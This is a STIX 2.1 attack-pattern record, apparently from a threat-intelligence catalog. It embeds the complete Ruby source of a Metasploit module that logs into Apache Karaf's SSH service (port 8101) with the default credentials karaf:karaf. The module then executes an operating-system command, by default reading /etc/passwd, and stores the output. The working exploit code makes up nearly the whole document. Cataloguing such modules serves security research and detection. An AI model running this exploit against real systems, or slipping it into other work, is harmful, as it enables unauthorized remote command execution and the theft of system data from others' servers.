{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a5f38155-d088-46d0-8445-a4ed2249856b",
    "created": "2024-08-14T16:27:29.884474Z",
    "modified": "2024-08-14T16:27:29.884477Z",
    "name": "\"Apache Karaf Default Credentials Command Execution\"",
    "description": " This module exploits a default misconfiguration flaw on Apache Karaf versions 2.x-4.x. The 'karaf' user has a known default password, which can be used to login to the SSH service, and execute operating system commands from remote.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ssh/apache_karaf_command_execution.rb",
            "external_id": "apache_karaf_command_execution.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Apache Karaf Default Credentials Command Execution\",\n      'Description'    => %q{\n        This module exploits a default misconfiguration flaw on Apache Karaf versions 2.x-4.x.\n        The 'karaf' user has a known default password, which can be used to login to the\n        SSH service, and execute operating system commands from remote.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Nicholas Starke <nick@alephvoid.com>'\n        ],\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => true,\n      'DisclosureDate' => '2016-02-09'))\n\n    register_options(\n      [\n        Opt::RPORT(8101),\n        OptString.new('USERNAME', [true, 'Username', 'karaf']),\n        OptString.new('PASSWORD', [true, 'Password', 'karaf']),\n        OptString.new('CMD', [true, 'Command to Run', 'cat /etc/passwd'])\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        Opt::Proxies,\n        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def cmd\n    datastore['CMD']\n  end\n\n  def do_login(user, pass, ip)\n    opts = ssh_client_defaults.merge({\n      :auth_methods    => ['password'],\n      :port            => rport,\n      :password        => pass,\n    })\n\n    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    begin\n      ssh = ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        Net::SSH.start(ip, user, opts)\n      end\n      if ssh\n        print_good(\"#{ip}:#{rport} - Login Successful ('#{user}:#{pass})'\")\n      else\n        print_error \"#{ip}:#{rport} - Unknown error\"\n      end\n    rescue OpenSSL::Cipher::CipherError => e\n      print_error(\"#{ip}:#{rport} SSH - Unable to connect to this Apache Karaf (#{e.message})\")\n      return\n    rescue Rex::ConnectionError\n      return\n    rescue Net::SSH::Disconnect, ::EOFError\n      print_error \"#{ip}:#{rport} SSH - Disconnected during negotiation\"\n      return\n    rescue ::Timeout::Error\n      print_error \"#{ip}:#{rport} SSH - Timed out during negotiation\"\n      return\n    rescue Net::SSH::AuthenticationFailed\n      print_error \"#{ip}:#{rport} SSH - Failed authentication\"\n    rescue Net::SSH::Exception => e\n      print_error \"#{ip}:#{rport} SSH Error: #{e.class} : #{e.message}\"\n      return\n    end\n\n    ssh\n  end\n\n  def run_host(ip)\n    print_status(\"#{ip}:#{rport} - Attempt to login...\")\n    ssh = do_login(username, password, ip)\n    if ssh\n      output = ssh.exec!(\"#{cmd}\\n\").to_s\n      if output\n        print_good(\"#{ip}:#{rport} - Command successfully executed.  Output: #{output}\")\n        store_loot(\"apache.karaf.command\",\n                \"text/plain\",\n                ip,\n                output)\n        vprint_status(\"#{ip}:#{rport} - Loot stored at: apache.karaf.command\")\n      else\n        print_error \"#{ip}:#{rport} - Command failed to execute\"\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-02-09",
    "x_mitre_platforms": [
        "unix'"
    ]
}